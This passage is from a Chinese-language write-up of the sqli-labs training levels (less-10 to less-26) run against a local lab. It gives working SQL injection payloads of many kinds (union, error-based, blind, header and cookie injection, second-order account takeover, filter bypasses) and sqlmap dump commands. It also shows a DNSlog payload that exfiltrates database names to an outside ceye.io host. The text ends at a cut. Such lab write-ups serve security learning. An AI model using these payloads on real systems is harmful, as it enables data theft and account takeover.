+<p>后续与less-10同理，只是单引号变双引号。</p>
+<h3 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h3><h4 id="1-手工"><a href="#1-手工" class="headerlink" title="1.手工"></a>1.手工</h4><p>先判断闭合符号：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-10/?id=1">http://127.0.0.1/sql/Less-10/?id=1</a>“ and sleep(2)–+  网页两秒后才回响，故为双引号注入；</p>
+<p>输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and (select load_file(concat(&quot;//&quot;,(database()),&quot;.t3asaf.ceye.io/bbb.txt&quot;)))--+</span><br></pre></td></tr></table></figure>
+
+<p>在ceye.io的DNS Query可以查看到 库名：<img src="/2025/07/11/sqli-labs/2024-11-24214932.png" alt="2024-11-24 214932"></p>
+<p>后续查表名，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and (select load_file(concat(&quot;//&quot;,(select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),&quot;.t3asaf.ceye.io/bbb.txt&quot;)))--+</span><br></pre></td></tr></table></figure>
+
+<p>若不加limit限制字数，则不会去解析DNS，因为太长了；</p>
+<h4 id="2-自动化（待）"><a href="#2-自动化（待）" class="headerlink" title="2.自动化（待）"></a>2.自动化（待）</h4><h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><h3 id="post-union注入"><a href="#post-union注入" class="headerlink" title="post union注入"></a>post union注入</h3><p>打开网页显示登录页面，</p>
+<p>在username一栏输入admin’</p>
+<p>在password一栏随意输入字符，显示如下图：<img src="/2025/07/11/sqli-labs/2024-11-25171342.png" alt="2024-11-25 171342"></p>
+<p>可知闭合方式为单引号，</p>
+<p>（或者尝试万能密码：在username：1’ or 1&#x3D;1# 能成功登录,可知为单引号闭合）</p>
+<p><strong>先判断列数</strong>，在username处输入1’ group by 3#</p>
+<p>显示<em>Unknown column ‘3’ in ‘group statement’</em>；</p>
+<p>把上面命令3改为2，无报错信息显示，故列数有2列；</p>
+<p><strong>判断回显位</strong></p>
+<p>username处输入： 1’ union select 1,2#</p>
+<p>显示：<em>Your Login name:1</em><br><em>Your Password:2</em></p>
+<p><strong>获取库名</strong>：1’ union select 1,database()#</p>
+<p>显示：<em>Your Login name:1</em><br><em>Your Password:security</em></p>
+<p>同理：获取表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1)#</span><br></pre></td></tr></table></figure>
+
+<p>获取列名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,(select column_name from information_schema.columns where table_schema=&quot;security&quot; and table_name=&quot;users&quot; limit 0,1)#</span><br></pre></td></tr></table></figure>
+
+<p>获取数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,(select group_concat(id,username,password) from users )#</span><br></pre></td></tr></table></figure>
+
+<p>该条语句的页面回显如下：<br><em>Your Login name:1</em><br><em>Your Password:1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity,6supermangenious,7batmanmob!le,8adminadmin,9admin1admin1,10admin2admin2,11admin3admin3,12dhakkandumbo,14admin4admin4</em></p>
+<h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><h3 id="使用sqlmap进行post注入"><a href="#使用sqlmap进行post注入" class="headerlink" title="使用sqlmap进行post注入"></a>使用sqlmap进行post注入</h3><p>用burpsuite抓包，再右键copy to file，<br>路径为”D:\burpsuite_packets\less-12.txt”</p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-25181740.png" alt="2024-11-25 181740"> </p>
+<p>结合网页上输入，可知uname为注入点参数名；</p>
+<p>在sqlmap中输入：</p>
+<p><strong>获取库，</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r &quot;D:\burpsuite_packets\less-12.txt&quot; --batch --dbs    </span><br></pre></td></tr></table></figure>
+
+<p><strong>获取表，</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r &quot;D:\burpsuite_packets\less-12.txt&quot; --batch  -D &#x27;security&#x27; --tables</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取列，</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r &quot;D:\burpsuite_packets\less-12.txt&quot; --batch  -D &#x27;security&#x27; -T &#x27;users&#x27; --columns</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取数据，</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r &quot;D:\burpsuite_packets\less-12.txt&quot; --batch  -D &#x27;security&#x27; -T &#x27;users&#x27; -C &#x27;id,password,username&#x27; --dump</span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| id | password   | username |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| 1  | Dumb       | Dumb     |</span><br><span class="line">| 2  | I-kill-you | Angelina |</span><br><span class="line">| 3  | p@ssword   | Dummy    |</span><br><span class="line">| 4  | crappy     | secure   |</span><br><span class="line">| 5  | stupidity  | stupid   |</span><br><span class="line">| 6  | genious    | superman |</span><br><span class="line">| 7  | mob!le     | batman   |</span><br><span class="line">| 8  | admin      | admin    |</span><br><span class="line">| 9  | admin1     | admin1   |</span><br><span class="line">| 10 | admin2     | admin2   |</span><br><span class="line">| 11 | admin3     | admin3   |</span><br><span class="line">| 12 | dumbo      | dhakkan  |</span><br><span class="line">| 14 | admin4     | admin4   |</span><br><span class="line">+----+------------+----------+</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><h3 id="post-报错注入"><a href="#post-报错注入" class="headerlink" title="post 报错注入"></a>post 报错注入</h3><p>输入admin，admin只显示登录成功，password处改为1，显示登录失败—-&gt;页面无回显，不能进行union联合注入</p>
+<p>usename处输入1’（password可以不输入）</p>
+<p>显示有 <em>near ‘’1’’) and password&#x3D;(‘’) LIMIT 0,1</em> </p>
+<p>故闭合符号为’) ; 且有报错提示，可以进行报错注入；</p>
+<p>分别尝试输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) group by 4#</span><br><span class="line">1&#x27;) group by 3#</span><br></pre></td></tr></table></figure>
+
+<p>均报错，而输入1’) group by 2# 无报错显示，列数为2;</p>
+<p>(也可以不判断列数，则例如使用extractvalue函数时语句为and 1&#x3D;extractvalue(1,concat(0x7e,(查询语句)))–+)</p>
+<p>进行注入，判断语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) union select 1,extractvalue(1,concat(0x7e,database()))#</span><br><span class="line">//判断库名</span><br><span class="line"></span><br><span class="line">1&#x27;) union select 1,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)))#</span><br><span class="line">//判断表名</span><br><span class="line"></span><br><span class="line">1&#x27;) union select 1,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)))#</span><br><span class="line">//判断列名</span><br><span class="line"></span><br><span class="line">1&#x27;) and 1=extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users )))#</span><br><span class="line">//取数据,</span><br><span class="line">  显示不完全可以搭配substring使用：</span><br><span class="line">1&#x27;)  and 1=extractvalue(1,concat(0x7e,(select substring(group_concat(id,username,password),32,32) from users)))#</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>username输入1”,有报错显示，判断出闭合符号为双引号，</p>
+<p>与less-13同理，可以使用报错注入，只是闭合符号不同；</p>
+<h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><h3 id="post-布尔注入"><a href="#post-布尔注入" class="headerlink" title="post 布尔注入"></a>post 布尔注入</h3><p>（默认只在username处进行输入，password可以不输入，后面例子同理）</p>
+<p>页面只有登录成功或者失败的显示，判断为布尔盲注；</p>
+<p>判断闭合符号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1#  //显示登录成功</span><br><span class="line">1&#x27; or 1=2#  //显示登录失败</span><br></pre></td></tr></table></figure>
+
+<p>故单引号闭合；（这里用sleep判断不出）</p>
+<p>进行布尔注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; or length(database())&lt;10#</span><br><span class="line">//显示登录成功，故库名长度小于10</span><br><span class="line"></span><br><span class="line">0&#x27; or ascii(substr(database(),1,1))&gt;=100#</span><br><span class="line">//登录成功，库名第一个字符ASCII值大于100，后续语句同理，可参考less-9...</span><br></pre></td></tr></table></figure>
+
+<p> 也可以使用sqlmap进行post注入，与less-12步骤一致；</p>
+<h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>页面只有真假值，可进行布尔注入</p>
+<p>判断闭合符号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&quot;) or 1=1#  //登录成功</span><br><span class="line">1&quot;) or 1=2# //登录失败</span><br></pre></td></tr></table></figure>
+
+<p>故闭合符号为”)  ,后续与less-15同理；</p>
+<p>eg：判断长度，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&quot;) or length(database())&lt;10#  //页面显示为真</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><h3 id="使用sqlmap加post指定参数"><a href="#使用sqlmap加post指定参数" class="headerlink" title="使用sqlmap加post指定参数"></a>使用sqlmap加post指定参数</h3><p>(误，待改)</p>
+<p>打开显示的界面：</p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-26125636.png" alt="2024-11-26 125636"></p>
+<p>当输入admin与admin，界面显示<img src="./flag1.jpg" alt="img" style="zoom:50%;" /></p>
+<p>提示重置密码，则user name保持为admin；</p>
+<p>使用sqlmap：</p>
+<p><em>（这里的 –data 指定了post的参数：uname&#x3D;admin）</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r &quot;D:\burpsuite_packets\less-17&quot; --data &quot;uname=admin&quot; --dbs</span><br><span class="line"></span><br><span class="line">python sqlmap.py -r &quot;D:\burpsuite_packets\less-17.txt&quot; --data &quot;uname=admin&quot; -D &#x27;security&#x27; --tables</span><br><span class="line"></span><br><span class="line">python sqlmap.py -r &quot;D:\burpsuite_packets\less-17.txt&quot; --data &quot;uname=admin&quot; -D &#x27;security&#x27; -T &#x27;users&#x27; --columns</span><br><span class="line"></span><br><span class="line">python sqlmap.py -r &quot;D:\burpsuite_packets\less-17.txt&quot; --data &quot;uname=admin&quot; -D &#x27;security&#x27; -T &#x27;users&#x27; -C &#x27;id,password,username&#x27; --dump</span><br><span class="line">//该获取数据的语句，显示出来一个表里数据全为NULL，可能原因是mysql数据不支持查询和更新是同一张表</span><br></pre></td></tr></table></figure>
+
+<p>但sqlmap会给出 *[INFO] table ‘<code>security</code>.users’ dumped to CSV file ‘C:\Users\ASUS\AppData\Local\sqlmap\output\192.168.138.128\dump\security\users.csv’，*可以去本机该路径下查看</p>
+<img src="./2024-11-26134315.png" alt="2024-11-26 134315" style="zoom:67%;" />
+
+<h3 id="post报错注入（-）"><a href="#post报错注入（-）" class="headerlink" title="post报错注入（!）"></a>post报错注入（!）</h3><p>已知username为admin，在password输入1’,会有报错提示，故可以对passwd参数上进行报错注入</p>
+<p>（且可以通过对源代码分析发现：$uname&#x3D;check_input($_POST[‘uname’]);   $passwd&#x3D;$_POST[‘passwd’];<br>有个过滤函数check_input，但没对passwd进行过滤，故可以对passwd参数进行注入；）</p>
+<p>在最后一步爆字段内容时候，按往常报错注入的写法会报错，<br>网页回显 “You can’t specify target table ‘users’ for update in FROM clause”。</p>
+<p>“原因是mysql数据不支持查询和更新是同一张表。所以我们需要加一个中间表。这个关卡需要输入正确账号因为是密码重置页面，所以爆出的是该账户的原始密码。如果查询时不是users表就不会报错。”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=&#x27; OR (updatexml(1,concat(&#x27;!&#x27;,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1)),1))#submit=submit</span><br><span class="line"> //用一个表暂存从 users 表中取出所有数据的查询，再从这个暂存的表中取出数据,带limit控制取出</span><br></pre></td></tr></table></figure>
+
+<p>具体方法参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linfangnan/p/13834250.html">https://www.cnblogs.com/linfangnan/p/13834250.html</a></p>
+<p>（注意：less-17修改的密码对后续的关卡也会通用）</p>
+<h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><h3 id="user-agent分析："><a href="#user-agent分析：" class="headerlink" title="user-agent分析："></a>user-agent分析：</h3><p>打开页面为<img src="/2025/07/11/sqli-labs/2024-11-26150028.png" alt="2024-11-26 150028"></p>
+<p>输入正确的账号与密码（admin，admin）后显示，</p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-26150122.png" alt="2024-11-26 150122"></p>
+<p>尝试对username或者password注入都不行（或者通过看源代码文件发现check_input对此两进行检查）；</p>
+<p>但发现当正常登录后如上图会显示user agent，故可猜测在user-agent有注入点；</p>
+<p>（看源代码发现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>故下面对user-agent进行注入（要在能成功登录后）</p>
+<p>&#x2F;&#x2F; sqlmap注入（执行时查到4个表均为emails？？？）</p>
+<h3 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h3><p>先用burp suite抓包，在user-agent处尝试输入单引号，显示</p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-26162054.png" alt="2024-11-26 162054"></p>
+<p>可以判断处在user-agent处的sql的insert语句格式，有三个参数，单引号闭合，继续输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(&#x27;!&#x27;,database()),2),1,1)#</span><br><span class="line">//得库名</span><br><span class="line">&#x27;or updatexml(1,concat(&#x27;!&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; )),2),1,1)# //得表名</span><br><span class="line">&#x27;or updatexml(1,concat(&#x27;!&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)),2),1,1)#得列名</span><br><span class="line">后续同理...</span><br></pre></td></tr></table></figure>
+
+<p>（当然，也可以直接在hackbar里修改user-agent:</p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-26162729.png" alt="2024-11-26 162729"></p>
+<p>但注意：在hackbar里的body处submit要写为Submit）</p>
+<h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><h3 id="referer-手工注入"><a href="#referer-手工注入" class="headerlink" title="referer 手工注入"></a>referer 手工注入</h3><p>先登录，登录成功后，页面有显示</p>
+<p><em>Your Referer is: <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-19/index.php">http://127.0.0.1/sql/Less-19/index.php</a></em></p>
+<p>故这里对referer进行注入；</p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-26165432.png" alt="2024-11-26 165432"></p>
+<p>如图，可知 单引号闭合，有两个参数；</p>
+<p>再输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or extractvalue(1,concat(&#x27;!&#x27;,database())),2)# //得库名</span><br><span class="line">&#x27; or extractvalue(1,concat(&#x27;!&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;))),2)#  //得表名</span><br><span class="line">后续同理...</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><h3 id="cookie手工注入"><a href="#cookie手工注入" class="headerlink" title="cookie手工注入"></a>cookie手工注入</h3><p>成功登录后显示，</p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-26170624.png" alt="2024-11-26 170624"></p>
+<p>推测对cookie进行注入；</p>
+<p>使用hackbar，由上图已知cookie名为uname，</p>
+<p>先输入uname&#x3D;1’ 显示 <em>near ‘’1’’ LIMIT 0,1’ at line 1</em></p>
+<p>可判断出闭合符号为单引号，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uname=&#x27;or extractvalue(1,concat(&#x27;!&#x27;,database()))#//得库名</span><br><span class="line">uname=&#x27;or extractvalue(1,concat(&#x27;!&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)))#//得表名</span><br><span class="line">uname=&#x27;or extractvalue(1,concat(&#x27;!&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)))#//得列名</span><br><span class="line">uname=&#x27;or extractvalue(1,concat(&#x27;!&#x27;,(select group_concat(id,username,password) from users)))#</span><br><span class="line">//得数据，显示字数有限可再搭配substring使用</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/11/sqli-labs/2024-11-26195114.png" alt="2024-11-26 195114"></p>
+<h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><h3 id="cookie注入，但经base64"><a href="#cookie注入，但经base64" class="headerlink" title="cookie注入，但经base64"></a>cookie注入，但经base64</h3><p>打开网页同less-20，当成功登录后，页面上有显示：</p>
+<p><em>YOUR COOKIE : uname &#x3D; YWRtaW4&#x3D; and expires: Tue 26 Nov 2024 - 21:00:53</em></p>
+<p>可知这经历过编码，推测为base64编码，则将要输入的代码先进行base64编码，再赋值给uname：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=MSc=   // 1&#x27;进行编码后得MSc=</span><br></pre></td></tr></table></figure>
+
+<p>显示有near ‘’1’’) LIMIT 0,1’ at line 1，故闭合符号位单引号加单括号 ；</p>
+<p>再将</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) and extractvalue(1,concat(&#x27;~&#x27;,(select database())))#</span><br></pre></td></tr></table></figure>
+
+<p>进行编码，赋值给uname；后续与该条语句方式同理；</p>
+<h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p>登录后有显示 <em>YOUR COOKIE : uname &#x3D; YWRtaW4&#x3D; and expires: Tue 26 Nov 2024 - 21:47:12</em></p>
+<p>与less-21同理，要对名为uname的cookie进行base64编码；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=MSc=   // 1&#x27;进行编码后得MSc=，页面无报错信息</span><br><span class="line">uname=MSI=   //1&quot;进行编码后得MSI=，页面显示 near &#x27;&quot;1&quot;&quot; LIMIT 0,1&#x27; </span><br></pre></td></tr></table></figure>
+
+<p>可知闭合方式为双引号，后续与less-21同理；</p>
+<h2 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h2><h3 id="绕过注释符"><a href="#绕过注释符" class="headerlink" title="绕过注释符"></a>绕过注释符</h3><p>打开网页显示同less-1，显示 <em>Please input the ID as parameter with numeric value</em></p>
+<p>在url处输入&#x2F;?id&#x3D;1 ，则网页正常显示<em>Your Login name:Dumb</em><br><em>Your Password:0</em></p>
+<p>在url处输入&#x2F;?id&#x3D;1’ 显示<em>near ‘’1’’ LIMIT 0,1’</em> ，故闭合符号为单引号；</p>
+<p>当后面加#，–+仍会显示有 <em>‘’ LIMIT 0,1’</em>     说明在这里注释符号被过滤；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;&#x27;   //多输入一个闭合符号，网页又正常显示信息，故可以让多输入的闭合符号来闭合后面的单引号</span><br></pre></td></tr></table></figure>
+
+<p>判断列数时，</p>
+<p>经尝试这里使用order&#x2F;group by均会报错，故可以通过union select 来尝试；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-23/?id=1&#x27; union select 1,2,3&#x27;  //不报错，列数为3列</span><br><span class="line">http://127.0.0.1/sql/Less-23/?id=-1&#x27; union select 1,2,3&#x27;  //判断出2，3为回显位</span><br><span class="line">http://127.0.0.1/sql/Less-23/?id=-1&#x27; union select 1,2,database()&#x27;   //知库名，后续语句同理</span><br></pre></td></tr></table></figure>
+
+<p>最后得下图，</p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-27141335.png" alt="2024-11-27 141335"></p>
+<h2 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h2><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p><strong>（POST型基于存储的二次注入）</strong></p>
+<p>对源代码进行分析知，这题解法为二次注入；</p>
+<p>（<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/105620978">https://blog.csdn.net/weixin_39934520/article/details/105620978</a>)</p>
+<p>or其他分析方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于 Less 24 中每次提交参数都会切换页面，因此没有任何注入点。此处考虑的就不是暴露敏感信息了，而是进行其他的破坏，例如夺取其他账号的权限。这时就需要考虑**二次注入**，此时我们注入恶意的参数，它不会被马上执行而是存入数据库。当该恶意参数被网页调用时，此时的参数往往是不转义的，就会产生攻击的效果。 </span><br></pre></td></tr></table></figure>
+
+<p>（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/linfangnan/p/13929460.html%EF%BC%89">https://www.cnblogs.com/linfangnan/p/13929460.html）</a></p>
+<p>这里以目的要登录admin用户的账号为例子：</p>
+<p>打开网页，显示如下：<img src="/2025/07/11/sqli-labs/2024-11-27192517.png" alt="2024-11-27 192517"></p>
+<p>点击”new user click here？“ ，<br>去注册一个名为 admin’# 的用户，密码先设置为123，</p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-27192738.png" alt="2024-11-27 192738"></p>
+<p>注册成功后，在网页的登录页面登录刚刚注册的账号,点击login后进入下图修改密码的页面，<img src="/2025/07/11/sqli-labs/2024-11-27192955.png" alt="2024-11-27 192955"></p>
+<p>此时显示用户仍为admin’#，先输入原设置的密码，再更改密码为111，点击reset，跳转到页面显示 <em>Password successfully updated</em>；</p>
+<p>之后登出，再进入输入账户与密码的页面，此时可以输入用户名admin，密码则为刚刚更改的密码111，则可以登录上admin的账号了；</p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-27193506.png" alt="2024-11-27 193506"></p>
+<h2 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h2><h3 id="and、or-过滤"><a href="#and、or-过滤" class="headerlink" title="and、or 过滤"></a>and、or 过滤</h3><p>打开页面显示如下图，<img src="/2025/07/11/sqli-labs/2024-11-27193716.png" alt="2024-11-27 193716"></p>
+<p>（上图最下一行会显示传入的id参数为啥）</p>
+<p>先输入&#x2F;?id&#x3D;1’  ,可判断闭合符号为单引号；</p>
+<p>输入：?id&#x3D;1’ and 1&#x3D;1–+ </p>
+<p>显示有：Hint: Your Input is Filtered with following result: 1’ 1&#x3D;1–</p>
+<p>可见and 确实被过滤了；</p>
+<p>尝试绕过对and：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; anandd 1=1--+ //复写and，hint显示1&#x27; and 1=1--，成功绕过</span><br></pre></td></tr></table></figure>
+
+<p>但注释符被过滤了，故在末尾多加一个闭合符号，尝试后可行；</p>
+<p>进行注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27;union select 1,2,3&#x27;  //页面正常显示，列数为3</span><br><span class="line">/?id=-1&#x27;union select 1,2,3&#x27; //判断出2，3为回显位</span><br><span class="line">/?id=-1&#x27;union select 1,2,database()&#x27; //判断出库名</span><br><span class="line">?id=-1&#x27;union select 1,2,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27;)&#x27;  //这里注意information里双写or，后续语句同理</span><br></pre></td></tr></table></figure>
+
+<p>最后得：<img src="/2025/07/11/sqli-labs/2024-11-27203113.png" alt="2024-11-27 203113"></p>
+<h2 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h2><h3 id="无法报错注入但能联合等等注入"><a href="#无法报错注入但能联合等等注入" class="headerlink" title="(无法报错注入但能联合等等注入)"></a>(无法报错注入但能联合等等注入)</h3><p>当输入&#x2F;?id&#x3D;1  页面正常显示信息（有回显位，该题能用联合注入）</p>
+<p>当输入&#x2F;?id&#x3D;1’等等<strong>均</strong>显示异常为 <em>Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in C:\phpstudy_pro\WWW\sql\Less-25a\index.php on line 37</em></p>
+<p>（该题不能用报错注入）</p>
+<p>故可判断为数值型*（后话：其实最先开始应该先判断是数字型还是字符型的，可以少绕弯路）*，因为能回显信息，可以使用union注入；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?id=-1 union select 1,2,3#  //判断出2、3为回显位</span><br><span class="line">/?id=-1 union select 1,2,database()#   //判断出库名，后续语句同理</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h2><h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><p>页面有显示: <em>all your spaces and comments belong to us.</em></p>
+<p>经尝试，该题and、or、注释符、空格均被过滤；</p>
+<p>先根据报错提示，判断出闭合符号为单引号；</p>
+<p>此题绕过注释符方法为在句尾加’1’&#x3D;’1 （用less-23的没法绕过此题)</p>
+<p>尝试用+、url编码绕过空格失败，<br>尝试<strong>报错注入加多用括号</strong>代替：</p>
